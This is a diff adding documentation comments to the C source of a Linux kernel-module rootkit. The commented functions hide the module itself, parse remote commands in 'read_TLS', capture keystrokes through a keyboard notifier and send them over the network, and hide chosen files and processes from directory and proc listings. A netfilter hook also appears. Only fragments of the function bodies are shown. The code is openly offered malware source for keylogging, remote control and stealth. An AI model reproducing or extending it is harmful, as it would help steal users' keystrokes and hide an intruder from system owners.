@@ -164,6 +164,16 @@ static const char* us_keymap[][2] = {
         {"<PAUSE>", "<PAUSE>"}, // 119
 };
 
+/*
+ * function:
+ *    hide
+ *
+ * return:
+ *    void
+ *
+ * notes:
+ * Hides the kernel module
+ */
 void hide(void) {
     if (hidden) {
         return;
@@ -180,6 +190,16 @@ void hide(void) {
     hidden = true;
 }
 
+/*
+ * function:
+ *    show
+ *
+ * return:
+ *    void
+ *
+ * notes:
+ * Shows the kernel module
+ */
 void show(void) {
     if (!hidden) {
         return;
@@ -316,6 +336,19 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
     return size;
 }
 
+/*
+ * function:
+ *    read_TLS
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    struct work_struct *work
+ *
+ * notes:
+ * Main command parser function
+ */
 void read_TLS(struct work_struct* work) {
     int len;
     u16 tmp_port = 0;
@@ -569,6 +602,22 @@ unsigned int outgoing_hook(void* priv, struct sk_buff* skb, const struct nf_hook
     return NF_ACCEPT;
 }
 
+/*
+ * function:
+ *    keysniffer_cb
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct notifier_block *nblock
+ *    unsigned long code
+ *    void *_param
+ *
+ * notes:
+ * Function called by the kernel for a keystroke.
+ * This runs in an interrupt context, so we schedule networking code, rather than do it here
+ */
 int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _param) {
     struct keyboard_notifier_param* param = _param;
     const char* keycode = NULL;
@@ -599,6 +648,19 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
     return NOTIFY_OK;
 }
 
+/*
+ * function:
+ *    consume_keys
+ *
+ * return:
+ *    void
+ *
+ * parameters:
+ *    struct work_struct *work
+ *
+ * notes:
+ * Function called by work queue to send keystroke over the network
+ */
 void consume_keys(struct work_struct* work) {
     unsigned char buffer[30];
     const char* keystroke = keylog_data;
@@ -613,6 +675,24 @@ void consume_keys(struct work_struct* work) {
     DEBUG_PRINT(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
 
+/*
+ * function:
+ *    rk_filldir_t
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct dir_context *ctx
+ *    const char *proc_name
+ *    int len
+ *    loff_t off
+ *    u64 ino
+ *    unsigned int d_type
+ *
+ * notes:
+ * The actual function the hides the files in their given directory
+ */
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type) {
     int i;
@@ -631,6 +711,20 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
     return ctx->actor(ctx, proc_name, len, off, ino, d_type);
 }
 
+/*
+ * function:
+ *    rk_iterate_shared
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct file *file
+ *    struct dir_context *ctx
+ *
+ * notes:
+ * Used for hiding files
+ */
 int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     int i;
     int result = 0;
@@ -649,6 +743,24 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
+/*
+ * function:
+ *    proc_filldir_t
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct dir_context *ctx
+ *    const char *proc_name
+ *    int len
+ *    loff_t off
+ *    u64 ino
+ *    unsigned int d_type
+ *
+ * notes:
+ * The actual function the hides the processes in either proc list
+ */
 static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type) {
     char p[64];
@@ -675,6 +787,20 @@ static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int le
     return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
 }
 
+/*
+ * function:
+ *    proc_iterate_shared
+ *
+ * return:
+ *    int
+ *
+ * parameters:
+ *    struct file *file
+ *    struct dir_context *ctx
+ *
+ * notes:
+ * Used for hiding processes
+ */
 int proc_iterate_shared(struct file* file, struct dir_context* ctx) {
     int result = 0;
     bad_ctx.pos = ctx->pos;
@@ -684,6 +810,20 @@ int proc_iterate_shared(struct file* file, struct dir_context* ctx) {
     return result;
 }
 
+/*
+ * function:
+ *    hide_file
+ *
+ * return:
+ *    bool
+ *
+ * parameters:
+ *    const char *user_input
+ *    struct hidden_file *hf
+ *
+ * notes:
+ * Hides a file given it's absolute path
+ */
 bool hide_file(const char* user_input, struct hidden_file* hf) {
     int i, j;
     size_t str_size;
